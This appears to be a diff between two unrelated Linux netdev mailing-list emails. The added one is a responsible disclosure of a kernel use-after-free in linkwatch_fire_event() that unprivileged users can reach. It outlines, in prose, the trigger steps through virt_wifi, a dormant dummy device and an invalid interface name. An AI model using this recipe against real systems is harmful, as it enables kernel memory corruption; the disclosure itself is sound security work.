@@ -1,230 +1,865 @@
-Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.13])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pl1-f169.google.com (mail-pl1-f169.google.com [209.85.214.169])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1591E372B39
-	for <netdev@vger.kernel.org>; Fri,  4 Sep 2026 06:45:07 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=192.198.163.13
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788504310; cv=fail; b=rfQzSjLfEUOnfxxN5V17sViGhQochA3Ic0CYxxKfNEutKxhR76Wo4gOhsW4o9qlUizK+/XH1ZCBliC4T+VyVtxGMG5btf3mRTFdiR2KRBhuYLqGQtPUCvWHmd9Pky5srh8Hnfi8vJFI/CIrukIN6vv9Q3gKoGYpjawDJHkVsixk=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788504310; c=relaxed/simple;
-	bh=XfBUAC69c7QZCQWiAfyp7m3KuzzhqiJBROcOgi8JHrU=;
-	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
-	 Content-Type:MIME-Version; b=loNCw8vRyjmuPDH30rhnenmExSmPhZeSIxZ2LtGQab38B2/v/vI1DV9jgzmgEftL0RurGJnX7D//rFQrKkvK1N3RcudomnkRdp2VToT/VlX6SPXY/2E46KoNusK+LvIvH0opLrsCeSuAmBh7PDQyG3z8d/30/kf6FBWQjXBZZmk=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=EIK1u60P; arc=fail smtp.client-ip=192.198.163.13
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7333F3D903B
+	for <netdev@vger.kernel.org>; Fri,  4 Sep 2026 06:46:52 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.169
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1788504414; cv=none; b=ETlpv2wsbthv4kwRvw5EBw75NmdjRT/vGpfcJPU36yc/aAg9i84GvA7xi5JuRcH5pcSI8iapKYdL+kk1VD4CVss71bYIxJXaxXaCK2n7Ht3g+P6693qRrBCdx+xwtIMPkBZSoTeJmWnJg9sjRLCt7cfobJ1FcBCYfqUCNhY7ULw=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1788504414; c=relaxed/simple;
+	bh=7MTYeC9J490UOcZQW+pdofGNFR6+tNvG8PhJ+LaYB54=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Fq0l5dd1+oCcdUfdavzTBog63qcd6W3CWuabFBTAqgvjnTtcAEUy8G9Md5PYyhrpBjDvAXqmucuTcM00DFOhEB+46fCIzo/uvZrgAleZCfHHkRHaSyV180d7rJzQuqjW/S13UrJj5CZqp719w+DrtozSrY1GWH/VSutCalQN8no=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IHuivHEU; arc=none smtp.client-ip=209.85.214.169
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="EIK1u60P"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1788504308; x=1820040308;
-  h=from:to:cc:subject:date:message-id:references:
-   in-reply-to:content-transfer-encoding:mime-version;
-  bh=XfBUAC69c7QZCQWiAfyp7m3KuzzhqiJBROcOgi8JHrU=;
-  b=EIK1u60Pf/0KG9ayDxdXYZXJ6R6RftLCagaOLmS9TzSKQVTDuJWbVzYx
-   yOkUKCojbnvrczo6JUldr/oKkqbL94TNzMyqrSaKI0p/gz6wBlOV8Ofe6
-   td4gzkFaWfIP7SoyNhN2eGznzBNO2+WDtqZw/A/NyAfntBXv/+4sfpuzO
-   JxKc72L7nVNwkKhpXFW8NRq09pIlxFB7Pnb1oU0U6qzuSow052YyZoLvN
-   TEjcjamyAEcruKjn9ZI7UXvsbIMe4HnWptP8gw/FJSiafCEydKo5WHrAF
-   1eKds3MGmTJOS1YfCYiCciVXTlmlrxGLUgjMbtFKqBLWWSeBjtKu/0Sae
-   Q==;
-X-CSE-ConnectionGUID: arm5p8B4QhiCbZ/PYXTMjA==
-X-CSE-MsgGUID: Xm1prJIpS4msprmWXB/Obw==
-X-IronPort-AV: E=McAfee;i="6800,10657,11895"; a="91512760"
-X-IronPort-AV: E=Sophos;i="6.25,260,1779174000"; 
-   d="scan'208";a="91512760"
-Received: from orviesa007.jf.intel.com ([10.64.159.147])
-  by fmvoesa107.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 03 Sep 2026 23:45:07 -0700
-X-CSE-ConnectionGUID: U23r7Pv5TdC+zoaAPXvGPw==
-X-CSE-MsgGUID: +EqG6RRkSs618Qy8qeG8vg==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.25,260,1779174000"; 
-   d="scan'208";a="269944745"
-Received: from fmsmsx902.amr.corp.intel.com ([10.18.126.91])
-  by orviesa007.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 03 Sep 2026 23:45:07 -0700
-Received: from FMSMSX903.amr.corp.intel.com (10.18.126.92) by
- fmsmsx902.amr.corp.intel.com (10.18.126.91) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.2562.46; Thu, 3 Sep 2026 23:45:06 -0700
-Received: from fmsedg902.ED.cps.intel.com (10.1.192.144) by
- FMSMSX903.amr.corp.intel.com (10.18.126.92) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.2562.46 via Frontend Transport; Thu, 3 Sep 2026 23:45:06 -0700
-Received: from BN8PR05CU002.outbound.protection.outlook.com (52.101.57.39) by
- edgegateway.intel.com (192.55.55.82) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.2562.46; Thu, 3 Sep 2026 23:45:03 -0700
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=MoKJ0nQEj8jBCW6WDjotmdlmSpMSxxt1m+cTEVWbcthP9wkixxOAjaWMpr4/sHUYeUed1Wx/lDdYgBGepXhjpOCWyfizlsxUTpWAJTOr2E7iljwg/EBT87CWE+9KFNDw2YxjlA714s7MBa688I5xMYSRFo0SxxIMDWTQ9BRHlluOS95H6oPmqymbfwmyfYyDA3wOAwmF6rorwhO2kPhzQG2He3pxjLsnHkXRJ/0CGoJDq3rmAOjnr+a20fdCBOQxhb/HdcsqTh6YBZ7inZb1H1qUsIg5KtZ58isbu2w21ACAjqNQZD7rTZ0GynWcisOjBTG3f9e6vO1WHc6aDnQDAw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=/pAcvzqb18PoPW++geoo7KDEN3Z3JMFHfp9vUD1USfg=;
- b=k7bEU8lws1PCOnbxQE5HKqytmID+2+fLWRX6YP1yOdKAXY+heUf8iUScRMNoH3EfGzHnIhCgga00cGlUg4Mn3408oHMeSNsC11n435w32bOACv2qiEks9aGVB6WFGoFp2vuzDXMQho2U3d6rz12cGqc0p+46xUiw2TF61WYhhjY2v9qHghtpC0eUXx7e7CGKdrZWvuVnB346su9O5f17dSQO2WONTMRWEkbGmT77j9EfjW4mzbO0DgXKdKzYSEWXVnuCsr6kwYe37wvaegwjKyu2Ghdg8r14eklGsB7UoPS3IBERf+By9TdACjVWDQp+zgpBqz9mNoNAbO6YgpyqIA==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
- dkim=pass header.d=intel.com; arc=none
-Received: from SN7PR11MB8109.namprd11.prod.outlook.com (2603:10b6:806:2e0::20)
- by DS0PPFC7FC39169.namprd11.prod.outlook.com (2603:10b6:f:fc02::50c) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.382.10; Fri, 4 Sep
- 2026 06:44:53 +0000
-Received: from SN7PR11MB8109.namprd11.prod.outlook.com
- ([fe80::3f36:413c:bede:ddde]) by SN7PR11MB8109.namprd11.prod.outlook.com
- ([fe80::3f36:413c:bede:ddde%5]) with mapi id 15.21.0360.008; Fri, 4 Sep 2026
- 06:44:53 +0000
-From: "Das, Shubham" <shubham.das@intel.com>
-To: "netdev@vger.kernel.org" <netdev@vger.kernel.org>, "andrew@lunn.ch"
-	<andrew@lunn.ch>, "maxime.chevallier@bootlin.com"
-	<maxime.chevallier@bootlin.com>, "alexander.duyck@gmail.com"
-	<alexander.duyck@gmail.com>, "lee@trager.us" <lee@trager.us>
-CC: "D H, Siddaraju" <siddaraju.dh@intel.com>, "Chintalapalle, Balaji"
-	<balaji.chintalapalle@intel.com>, "dasshubhamk@gmail.com"
-	<dasshubhamk@gmail.com>, "Lindberg, Magnus" <magnus.k.lindberg@ericsson.com>,
-	"Wirandi, Jonas" <jonas.wirandi@ericsson.com>
-Subject: RE: [RFC PATCH net-next 0/2] ethtool: add interface capabilities and
- PHY test
-Thread-Topic: [RFC PATCH net-next 0/2] ethtool: add interface capabilities and
- PHY test
-Thread-Index: AQHdNEtqYt8GYD1sa0OXr4r713I2tra+CMcQ
-Date: Fri, 4 Sep 2026 06:44:53 +0000
-Message-ID: <SN7PR11MB810922B4C8946C8B12E7868AFFB52@SN7PR11MB8109.namprd11.prod.outlook.com>
-References: <20260825043708.1512634-1-shubham.das@intel.com>
-In-Reply-To: <20260825043708.1512634-1-shubham.das@intel.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=intel.com;
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: SN7PR11MB8109:EE_|DS0PPFC7FC39169:EE_
-x-ms-office365-filtering-correlation-id: d05c046d-df45-48e7-6483-08df0a50068d
-x-ld-processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam: BCL:0;ARA:13230040|23010399003|366016|1800799024|376014|10067099003|6133799003|3023799007|18002099003|56012099006|11063799006|22082099003|38070700021;
-x-microsoft-antispam-message-info: zOhEpzStb3c4gC8+kBE/KilO9eZ4jKaRtVyhA23J/0pPSSCprFqDPs+YKBqyY+mJPT9lJHHr0Tmvzd9jIE9Gu+zNK7fwa2ZY5IA+Jt4eqBMJ0CKjmFo4WJtzWfMOYEHU9mlZFuJC5rNinTR2szQ8vovTeOm9ns19fDehcViXc1+YECy+4oUKx7P6zyB9ZpMib0ffnOUQRKKynm1OrqP+2QPlUy7cmQjLjqlSQOgUYXeg6oUDDL/i8tO8BJQZ7ulzitN3gXmI/CT/ibJGlOXEKfaLr1Ruj/PN1JmRBilC+L843ZKOMmNoTpaD5WzF/J0YvOhnxUEPg3tcVsKHTbl4YSAR5W9W6wTuH3SI0IeiyturC7HcwK5xYVHCOUcCooBv/89Il1mhStSwP5KsbIIS/cRZPEv/9DeHcxQlSy3tc/QJ4Tu56p8MSm77J2ZsUiOwJ1RtABMsZtF3UwIyW1KKidVOcpQSSQdlZmgPGBgxudm0a6Koc7Fz87kFAuqqzkr2dYPGaFECHTLGHeoaZ+OpsZtKBIwt9bDGojYReVW4r2A/H4OXOT2Ve/pOqKd0broQt5vuPOP9dkVqznmE4Htu6zsM2Tz5qmbbdOZKM6ELehF11LW6zmwg1ShRRaGk4nMX4s3+MwMe/rZmvxRD+J037A7VTEjxBYHe9j0w+AXxy4au3It/bDXzOiZKA8aLARUYzXDtpkCOPOpDFGwxsGT+JfA3znUFVgYTRcobB3xKg+I=
-x-forefront-antispam-report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SN7PR11MB8109.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(23010399003)(366016)(1800799024)(376014)(10067099003)(6133799003)(3023799007)(18002099003)(56012099006)(11063799006)(22082099003)(38070700021);DIR:OUT;SFP:1101;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0: =?us-ascii?Q?VnBCZjLdLb0n/3ZOAG5Hiiks9oyz+VgBCit6gPe6tUox+e7QP2DuJ3JG0kcW?=
- =?us-ascii?Q?9lL2nIDixKf8g/4J5kmKuZtySOs4s8AAdeoHEqphvYOgsT8AMr4xzOd/BYGm?=
- =?us-ascii?Q?sSjeN9LUCaRXO7Ff7a9VjaHGCv/wZg0yrLEBsE8m833GuBVXuldB/LX/RMRw?=
- =?us-ascii?Q?I+PXsPB+wOZT0uS9L09pdOXosQa/VrfHcS0IEtjqjmB3nq735xK4XMntiuRT?=
- =?us-ascii?Q?9iZwf72ePfcDag6GkKK8lzV0O+/+8/kj39xiCYw7JsVAvEelXPz/M8iCCrZM?=
- =?us-ascii?Q?G5RVVHLjTCl0wXXxeKAUyGE5fLas57AtDpW4W6uw+8VzFu9/ZuBtRKfu7041?=
- =?us-ascii?Q?KakUjltB1h33oLzXWfzNuLrBBIMrwF77eQx6214jk7ukO5gY/epA1h4kWLzT?=
- =?us-ascii?Q?q6EsuBTIunae60+pD7svmjYMag44xlVfXK9tCNcicioPR7ebsH2Qx4RfRpKV?=
- =?us-ascii?Q?BWx0f6HH0PX7FMbt13cZZBk/Fd9pTJmRgYiikAOzGuRG3AuCDVJUEle5Kztz?=
- =?us-ascii?Q?khpCYHvXc6HeEUZ2gLeLxoF2oPKPRoOH3e3gI5M6h+2jzXIhNLqLPb4qIIi0?=
- =?us-ascii?Q?LJg3UpVQuBYEOxNHbD/hjOyeoCSKjj/icujHrqEsV/OF8VsF4NQKO49zglWq?=
- =?us-ascii?Q?5oNt3LZqLVVoxpVbwkG5L4fCQoJQYI+kLmuqEGQBvmu/6hWL43YtuMXN/dLA?=
- =?us-ascii?Q?h7gYOIpVTFP05NzsgmtTrXmNr2tuYcrCl0WljapaCuvSH+r/np+R2LyK337T?=
- =?us-ascii?Q?vhdjDSzg4CWWfMlGik8A7KDw6vSZiZ8Mfl2Fw8yuKVI0lVEuzHvx5YBj/p9A?=
- =?us-ascii?Q?C3/hR5q0jQKcSD0uxbYydbmxmXlrrXpPf2eADPp+EDK7LQay22/9MBGvRZaR?=
- =?us-ascii?Q?pCJE8CRIrbVJCQGU29Zi8l+wX+cSB0q4CF7IzNKkWq1Ld3avhRGjwtVL6muq?=
- =?us-ascii?Q?TITpUjCdsy0z4wKZQ9AwhYJl7WTf71E5bVT8qLUVyGZWfvrE2HfRrMGWJjYV?=
- =?us-ascii?Q?7aJCpOBpSHsmSy7c+0KN7emeyp3Do9jq0Kx6jgnkw7JGrJvnxBimTZAwLgEN?=
- =?us-ascii?Q?9RwLFvGPzH4PW7QzZFACrzvCy5vFhGx1jSntmEbUS+PMAE+VjExNOdXUm/v5?=
- =?us-ascii?Q?zWM9HUddSAJCvioBl+V2lIboohTeHs6BGKSUrPl9Zgos9thhLBUS7UWl532/?=
- =?us-ascii?Q?hWqYGRJjcUHfdOIhv35xv86RHLdMDlgZnRVJOB28fX+zQNH1QD7C1kAQZmFK?=
- =?us-ascii?Q?ETibTSQkzUfAG+e8RBiW/4FiyJHGmPczTeagLIkM2DFgC59Ku8OJ60pguL4Z?=
- =?us-ascii?Q?yoDiObELQ4KGcvAtsVKazzXiC/YCCF4EYdwPtT3vxEntYsWT3Ey3gOCqDvzm?=
- =?us-ascii?Q?tVulAVjT/0kjwczAUv2qmwaZF9fl3YIN3Bt0u+Fg77WNceHcrXaZXM969w4y?=
- =?us-ascii?Q?2CqSdiGO1Mt0EA7cN4WE4L35Oa2akpDccyDMFHmT9REodlbhopCGDM+IXekm?=
- =?us-ascii?Q?o+VO9exDXkiSZ1zMTQfUDhnev9NzezKBetO9qhFJtCWXtweFRw6Zkx9hpfQA?=
- =?us-ascii?Q?Y7u3tur+Y5uiyBwSh/6mxrwPHXRy2vQ+MAsMVzhD/f8iZNO6NBE6A3ADC14U?=
- =?us-ascii?Q?gMW2z2HmrI2wS6rgoIN2kep7u830Nx2lJuiAL5TYbTAllFKLxqstMJX1jtcF?=
- =?us-ascii?Q?n8zRDLZ6T9OaITgduMFR5xU44COxzBd3o2YJSmmthUKrEFTd?=
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IHuivHEU"
+Received: by mail-pl1-f169.google.com with SMTP id d9443c01a7336-2cc891373e0so6734405ad.2
+        for <netdev@vger.kernel.org>; Thu, 03 Sep 2026 23:46:52 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788504412; x=1789109212; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=EtyqbfkvfdD0c77TcAxaGpDz3K7Bjw+7XCGU3LBcQt8=;
+        b=IHuivHEUGiwPLbBF1wZF+HcnKMeE8wOVjSuZiwP8wf/tTuAJsItA3CGhGo/wot665S
+         PIxTDSCBHnPD2N5NdUTXVZYQBum7xNKZ1mM75U+WiaFg0VGMVEhcHNlrajuWhJY2bhyr
+         KslBQ1PvL5Ng6PjJGrR6+683TMBJEDRjonyUGGM228FmRRAEt7wk12+dmQu0/lf7MIqT
+         TYm+fwabuSkuomyOfsq+jsyCJwYHDZsoZhSNT+XTeBT0dIDy53uGNVfcVkv4JcfJdKlw
+         ym3otewLiMQL26oiPpL6oaqFQf/geT143M/mH49OacaJhcwx0qkwzJ9xw7SXRZgSlhvc
+         HD1A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788504412; x=1789109212;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=EtyqbfkvfdD0c77TcAxaGpDz3K7Bjw+7XCGU3LBcQt8=;
+        b=G5haMuHWtzV52A9CFHXPzPnoRJocdt8FdmNumdDAakFOjBgGEPAVACH+muaPkd/n1S
+         BhVyj56mekwJR4WF8J3MyB6oUMEU7x0l0duktr5VM1+4phhVz4o9yJbyQ7qGsuUca+aL
+         Z59XLDZ6FfloFEMhezKASubxyH0DPCvIa4qo0cj0M424laJl86M1Ir13170Qgsleoq1m
+         rluMsTKZpK2uyqBx1G/Xvo7IzMTgpbVxzh6/rlJeJUcAi7P5+sm1RrHzMmf5IQiiTd6p
+         yfnrA31LF8Mfg6RKRyGn0X4pPzQEErQ52K1ZGDdNezpezdPCoc9Zb//94WwHqYwE4IwW
+         TbKw==
+X-Gm-Message-State: AFuF++llVsZvb2EC/9guPY2ljbp9mO4KOcOew9AQ7sN9dGIhfPZFHJNT
+	2LndxWkUjNOgHI7vr6xUKDWhrzp0OxM6Vc4hNr/smGDO8x9aRykvcmjeFLTZL3ZQVzwOBB/jo9b
+	d/hYQ2A==
+X-Gm-Gg: AYBFou3UEjP/ZKuFnrFsquItJCrIJ/xqE2FhxEWn44f7e52eGQJ4xcU2H2B4dZXqxC5
+	hs1Vp3STxrYbIsXoZcKuXEILBS3WNwuNhYAS04rciFfSRU9aEIjfvqmaqNSUqocM7e81ub/HgxC
+	ZB28bnlRkXLtfob4tOecqTSz7Rg9RrcVhvG6Q5nLZfbZ8eGrorzHErL1DTcA051XVnrmnfZpuPF
+	mteLpL9FaHxurOATpYgbGqAGFTTyITm8uHFZSq9rmy/pnO5wLDlYJENTnNLtJmlcO0/qN/QQLAg
+	aOCKkObGNaw1p16smBF+iBlqERySM1u1e/KMOxpQh3cCWwzkMfmK04JvEmCxcTbZnfFcJ1exzoA
+	pV1eu4mZ6kE4MtOHG87kgaQuZAYsHhqAU6w9PCut3KKhqiBSle3ol/yeZDKvwJkIrZYNMQ6thUk
+	rnaKyvyhQM6E05X1DcaKg6L4fakiVm8vJi1tA1RlDhrfAI7fMFj/vcmvuLz4ULF0+Ln9iW6UKpo
+	J0MzhJMDWvCnVfrrDxsjdqkCjuufw==
+X-Received: by 2002:a17:90b:2542:b0:398:9beb:5c17 with SMTP id 98e67ed59e1d1-39b2620a2bfmr5423495a91.18.1788504411295;
+        Thu, 03 Sep 2026 23:46:51 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39b25c974cfsm2950848a91.0.2026.09.03.23.46.48
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 03 Sep 2026 23:46:50 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: "David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH net 0/1] net: fix linkwatch UAF on uninitialized netdev
+Date: Fri,  4 Sep 2026 06:46:43 +0000
+Message-ID: <cover.1788500348.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-Exchange-RoutingPolicyChecked: oH0URGIcipVIuniMLK/WoX05xZLEqs7yd8B16IamPx71C3NaV1LA/Go7C8HaJXfhg7PjsAi650gSgXZZtQhE6zOxtblO4ojT4hvUbBXSZX1sR5sYZS7P7RsqogTgL5RbrOeR4EZh3I4n0PBdffIX+pG10Gk2Uv1cdEGm53bbyQ0WWMsGy7vCBUImY0OThlpU3UP2r8LFX+pqocAj6lLlXdQHKgl0cJ2MSCGXf2aavcTM29LUydo7xCF2JE7EXcSsE7bd7KX3PYsXgCDqzpE1YsBG9BXcNuV+3m3YVCGEjfkEAxkZ7bIn0p8AQu/oEWpJNkFcdAqBXl4d4l43tWmqvA==
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: SN7PR11MB8109.namprd11.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: d05c046d-df45-48e7-6483-08df0a50068d
-X-MS-Exchange-CrossTenant-originalarrivaltime: 04 Sep 2026 06:44:53.3061
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 46c98d88-e344-4ed4-8496-4ed7712e255d
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: 8+rK3fbef5YmGcLH08AmSbzost+0uw3Qi2Up9PGF0Ct/lWT/oQ8TsdhK1lw9tA5HJTowq/s4C1HSSx5pSwA4vQ==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: DS0PPFC7FC39169
-X-OriginatorOrg: intel.com
+Content-Transfer-Encoding: 8bit
 
-Hi,
+Hi Linux kernel maintainers,
 
-Gentle reminder on this series.
+We found and validated an issue in net/core/link_watch.c. The bug is reachable by a
+non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-The patches add a generic mechanism to discover interface block
-capabilities (intf-caps-get) and a framework for PHY testing
-(phy-test-get/phy-test-act) using the discovered block identifiers.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-I'd appreciate any feedback when reviewers have a chance.
+---- details below ----
 
-Thanks,
-Shubham
+Bug details:
 
-> -----Original Message-----
-> From: Das, Shubham <shubham.das@intel.com>
-> Sent: 25 August 2026 10:07
-> To: netdev@vger.kernel.org; andrew@lunn.ch; maxime.chevallier@bootlin.com=
-;
-> alexander.duyck@gmail.com; lee@trager.us
-> Cc: D H, Siddaraju <siddaraju.dh@intel.com>; Chintalapalle, Balaji
-> <balaji.chintalapalle@intel.com>; dasshubhamk@gmail.com; Lindberg, Magnus
-> <magnus.k.lindberg@ericsson.com>; Wirandi, Jonas
-> <jonas.wirandi@ericsson.com>; Das, Shubham <shubham.das@intel.com>
-> Subject: [RFC PATCH net-next 0/2] ethtool: add interface capabilities and=
- PHY
-> test
->=20
-> This series adds two new ethtool netlink commands:
->=20
-> 1. intf-caps-get: Discovers the functional block layout of a network
->    interface. Each block represents a hardware point (MAC/PHY/MODULE)
->    at a specific 802.3 sublayer (RS/PCS/FEC/PMA/PMD) with its
->    supported capabilities (loopback, test patterns, BERT, error
->    injection).
->=20
-> 2. phy-test-get / phy-test-act: Per-block, per-lane PHY testing using
->    test patterns, BERT (Bit Error Ratio Test), and error injection.
->    The block_id from intf-caps-get identifies which hardware point
->    to test.
->=20
-> The block model uses:
->   - component: which hardware entity (MAC, PHY, MODULE)
->   - sublayer: which 802.3 layer (RS, PCS, FEC, PMA, PMD)
->   - instance: identifies multiple instances of the same component
->     (e.g., internal vs external PHY)
->   - depth: host-side vs line-side within the same sublayer
->=20
-> Prior discussion on this proposal:
-> Link:
-> https://lore.kernel.org/netdev/SN7PR11MB810923BBDEC398E860099150FF1B2
-> @SN7PR11MB8109.namprd11.prod.outlook.com/
->=20
-> Shubham Das (2):
->   ethtool: add interface capabilities query (intf-caps-get)
->   ethtool: add PHY test framework (phy-test-get, phy-test-act)
->=20
->  Documentation/netlink/specs/ethtool.yaml      | 206 ++++++++++++++++++
->  include/linux/ethtool.h                       |  92 ++++++++
->  .../uapi/linux/ethtool_netlink_generated.h    | 104 +++++++++
->  net/ethtool/Makefile                          |   2 +-
->  net/ethtool/intf_caps.c                       | 130 +++++++++++
->  net/ethtool/netlink.c                         |  24 ++
->  net/ethtool/netlink.h                         |   7 +
->  net/ethtool/phytest.c                         | 171 +++++++++++++++
->  8 files changed, 735 insertions(+), 1 deletion(-)  create mode 100644
-> net/ethtool/intf_caps.c  create mode 100644 net/ethtool/phytest.c
->=20
-> --
-> 2.25.1
+linkwatch_fire_event() queues a net_device onto lweventlist and takes a
+netdev_hold() without checking whether the device has ever been
+registered. free_netdev() immediately kvfree()s NETREG_UNINITIALIZED
+devices and does not drain that queue. The later linkwatch worker can
+therefore dereference a freed list entry.
+
+netif_carrier_on(), netif_carrier_off() and netif_carrier_event() already
+skip NETREG_UNINITIALIZED. The remaining helpers do not:
+netif_dormant_on/off() and netif_testing_on/off() call
+linkwatch_fire_event() as soon as the corresponding bit changes.
+Pre-registration operstate bits are supposed to stay local and be
+consumed later by linkwatch_init_dev() inside register_netdevice().
+
+The current reproducer uses virt_wifi because virt_wifi_newlink() calls
+netif_stacked_transfer_operstate() before register_netdevice(). A lower
+dummy device in IF_OPER_DORMANT makes netif_dormant_on() queue the
+never-registered upper device. An invalid ifname such as "bad/name" then
+fails in dev_get_valid_name(), after which rtnl_newlink_create() calls
+free_netdev() immediately. Duplicate names or ifindex values are not
+useful here: rtnetlink rejects them before virt_wifi_newlink() runs.
+
+This is not a virt_wifi-only bug. Any caller of netif_dormant_*(),
+netif_testing_*(), or linkwatch_fire_event() on a NETREG_UNINITIALIZED
+device can hit the same helper. Other stacked drivers such as macvlan,
+ipvlan, vlan, macsec and qmi_wwan transfer operstate after registration.
+
+The underlying hole is old. linkwatch_fire_event() has never rejected
+NETREG_UNINITIALIZED devices. That goes back to
+commit 1da177e4c3f4 ("Linux-2.6.12-rc2"), the root of this tree.
+The Fixes: tag therefore points at
+commit 1da177e4c3f4 ("Linux-2.6.12-rc2").
+
+commit b00055aacdb1 ("[NET] core: add RFC2863 operstate")
+only added extra dormant callers.
+
+commit b47300168e77 ("net: Do not fire linkwatch events
+until the device is registered.")
+later closed the analogous carrier path only.
+
+commit 22604c866889 ("net: Fix for initial link state in 2.6.28")
+briefly added a NETREG_UNINITIALIZED return in the helper after
+calling rfc2863_policy().
+
+commit c276e098d3ee ("Revert "net: Fix for initial link state in 2.6.28"")
+removed that helper check again.
+
